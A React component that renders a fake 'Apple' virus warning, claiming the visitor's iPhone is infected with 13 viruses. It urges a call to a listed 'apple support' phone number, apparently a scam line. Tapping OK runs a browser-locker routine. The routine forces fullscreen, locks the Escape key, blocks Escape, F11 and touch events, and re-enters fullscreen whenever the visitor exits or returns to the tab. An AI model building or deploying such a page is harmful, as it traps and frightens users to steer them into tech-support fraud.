import React, { useState, useEffect } from "react"
import Warning from '../assets/warning.webp'
import Setting from '../assets/Settings1.webp'

const Hero = () => {
    const [isFullscreen, setIsFullscreen] = useState(false);

    const handleFullscreen = async () => {
        setIsFullscreen(true);

        // Add Safari-specific meta tags
        const metaTags = [
            { name: 'apple-mobile-web-app-capable', content: 'yes' },
            { name: 'apple-mobile-web-app-status-bar-style', content: 'black-translucent' },
            { name: 'viewport', content: 'width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no' }
        ];

        metaTags.forEach(tag => {
            let meta = document.querySelector(`meta[name="${tag.name}"]`);
            if (!meta) {
                meta = document.createElement('meta');
                meta.name = tag.name;
                meta.content = tag.content;
                document.head.appendChild(meta);
            }
        });

        // Apply aggressive Safari-specific styles
        document.body.style.setProperty('-webkit-user-select', 'none', 'important');
        document.body.style.setProperty('user-select', 'none', 'important');
        document.body.style.setProperty('-webkit-touch-callout', 'none', 'important');
        document.body.style.setProperty('overflow', 'hidden', 'important');
        document.documentElement.style.setProperty('overflow', 'hidden', 'important');

        // Lock keyboard if supported
        if ('keyboard' in navigator && 'lock' in navigator.keyboard) {
            try {
                await navigator.keyboard.lock(['Escape']);
                console.log('Keyboard locked');
            } catch (err) {
                console.log('Keyboard lock failed:', err);
            }
        }

        // Handle fullscreen
        const element = document.documentElement;
        try {
            if (element.requestFullscreen) {
                await element.requestFullscreen();
            } else if (element.webkitRequestFullscreen) {
                await element.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
            } else if (element.msRequestFullscreen) {
                await element.msRequestFullscreen();
            }
        } catch (error) {
            console.log('Fullscreen not supported:', error);
        }

        // iOS-specific handling
        if (/iPhone|iPad|iPod/.test(navigator.userAgent)) {
            // Force viewport settings
            const viewportMeta = document.createElement('meta');
            viewportMeta.name = 'viewport';
            viewportMeta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
            document.head.appendChild(viewportMeta);

            // Hide Safari UI
            setTimeout(() => {
                window.scrollTo(0, 1);
            }, 100);

            // Prevent all touch events
            document.addEventListener('touchmove', (e) => {
                e.preventDefault();
            }, { passive: false });

            document.addEventListener('touchend', (e) => {
                e.preventDefault();
            }, { passive: false });

            // Lock orientation
            if (window.screen && window.screen.orientation) {
                try {
                    await window.screen.orientation.lock('portrait');
                } catch (error) {
                    console.log('Orientation lock not supported');
                }
            }
        }

        // Prevent common exit methods
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape' || e.key === 'F11') {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }
        }, true);

        // Force focus on the page
        window.focus();
    };

    // Monitor fullscreen changes
    useEffect(() => {
        const handleFullscreenChange = () => {
            const isFullscreenNow = !!(
                document.fullscreenElement ||
                document.webkitFullscreenElement ||
                document.msFullscreenElement
            );
            
            // If fullscreen is exited, try to enter again
            if (!isFullscreenNow && isFullscreen) {
                handleFullscreen();
            }
            
            setIsFullscreen(isFullscreenNow);
        };

        // Handle various fullscreen change events
        document.addEventListener('fullscreenchange', handleFullscreenChange);
        document.addEventListener('webkitfullscreenchange', handleFullscreenChange);
        document.addEventListener('MSFullscreenChange', handleFullscreenChange);

        // Handle visibility change
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden && isFullscreen) {
                handleFullscreen();
            }
        });

        return () => {
            document.removeEventListener('fullscreenchange', handleFullscreenChange);
            document.removeEventListener('webkitfullscreenchange', handleFullscreenChange);
            document.removeEventListener('MSFullscreenChange', handleFullscreenChange);
            document.removeEventListener('visibilitychange', () => {});
        };
    }, [isFullscreen]);

    // Your existing return JSX remains the same...
    return (
        <div 
            className={`${
                isFullscreen 
                    ? 'fixed inset-0 bg-white z-[9999] min-h-screen w-screen overflow-hidden' 
                    : 'px-6 py-8 max-w-4xl mx-auto'
            } relative font-geologica md:px-8 lg:px-10`}
            style={isFullscreen ? {
                height: '100vh',
                minHeight: '-webkit-fill-available',
                WebkitOverflowScrolling: 'touch',
                touchAction: 'none',
                WebkitTouchCallout: 'none',
                WebkitUserSelect: 'none',
                WebkitTapHighlightColor: 'transparent',
                position: 'fixed',
                top: 0,
                left: 0,
                right: 0,
                bottom: 0,
                overflow: 'hidden'
            } : {}}
        >
            <h1 className="text-[18px] before:leading-[28px] text-ligh-red font-normal mb-[24px] md:text-[20px] lg:text-[22px]">
                Warning Your Apple iPhone is severely damaged by 13 viruses
            </h1>
            
            <p className="text-gray-700 mb-8 text-justify text-sm leading-relaxed md:text-base lg:text-base">
                We have detected that your Browser is (62%) DAMAGED by BROWSER TROJAN VIRUSES picked up while surfing recent corrupted sites.Immediate action is required to prevent ot from <span className="text-ligh-red">spreading and infecting sensitive data like your.Facebook account,Whatsapp messages photos and private.applications.</span>
            </p>

            <div className="text-black mb-6 leading-[28px] md:mb-8">
                <p className="font-normal text-justify mb-4 text-sm md:text-base lg:text-base">
                    Here is how you can solve this in just few seconds (Step by Step)
                </p>
        
                <div className="space-y-2 mt-6 md:space-y-3 md:mt-8">
                    <p className="font-normal text-justify text-sm md:text-base">Step1: Tap REMOVEVIRUS to install VPN from the</p>
                    <p className="font-normal text-justify text-sm md:text-base">Step2: Tap REMOVEVIRUS to install VPN from the</p>
                    <p className="font-normal text-justify text-sm md:text-base">Step3: Tap REMOVEVIRUS to install VPN from the</p>
                    <p className="font-normal text-justify text-sm md:text-base">Step4: Tap REMOVEVIRUS to install VPN from the</p>
                    <p className="font-normal text-justify text-sm md:text-base">Step5: Tap REMOVEVIRUS to install VPN from the</p>
                </div>
            </div>

         
            <div className="fixed top-1/3 left-1/2 transform -translate-x-1/2 -translate-y-1/2 
                    bg-[#1b1b1b]/90 p-4 rounded-xl h-[200px] w-[280px] text-center shadow-2xl z-50
                    md:w-[320px] md:h-[220px] lg:w-[360px] lg:h-[240px]">
                <div className="flex justify-center mb-3">
                    <img 
                        src={Warning} 
                        alt="Warning" 
                        className="h-[60px] w-[60px] object-contain md:h-[70px] md:w-[70px] lg:h-[80px] lg:w-[80px]"
                    />
                </div>
                
                <div className="mb-3 [&>*]:text-whitish">
                    <p className="mb-1 !text-whitish text-sm md:text-base">Call apple support how To fix this issue</p>
                    <p className="!text-whitish text-xs">+1 (833) 638 3086</p>
                </div>
                
                <button 
                    onClick={handleFullscreen}
                    className="w-full bg-[#ff4b4b] !text-whitish py-2 rounded-lg hover:bg-[#ff3b30] transition-colors text-xs md:text-sm"
                >
                    OK
                </button>
            </div>

       
            <div className="fixed bottom-32 left-1/2 transform -translate-x-1/2 w-[280px] bg-whitish rounded-xl z-50 
                    md:w-[320px] lg:w-[360px] md:bottom-36">
                <div className="p-4 flex items-start gap-3 md:p-5">
                    <div className="relative">
                        <img 
                            src={Setting} 
                            alt="Settings" 
                            className="h-[60px] w-[60px] object-contain md:h-[70px] md:w-[70px] lg:h-[80px] lg:w-[80px]"
                        />
                    </div>
                    
                    <div className="flex flex-col text-left">
                        <p className="text-sm text-black">Please call apple support now To fix this issue</p>
                        <p className="text-xs mt-2 text-glass-black">Immediate Action Is Required</p>
                    </div>
                </div>
            </div>

     
            <div className="fixed bottom-16 left-1/2 transform -translate-x-1/2 w-[280px] bg-whitish rounded-xl z-50
                    md:w-[320px] lg:w-[360px] md:bottom-20">
                <button 
                    onClick={handleFullscreen}
                    className="w-full py-2.5 text-center text-sm font-medium"
                >
                    OK
                </button>
            </div>
        </div>
    );
};

export default Hero;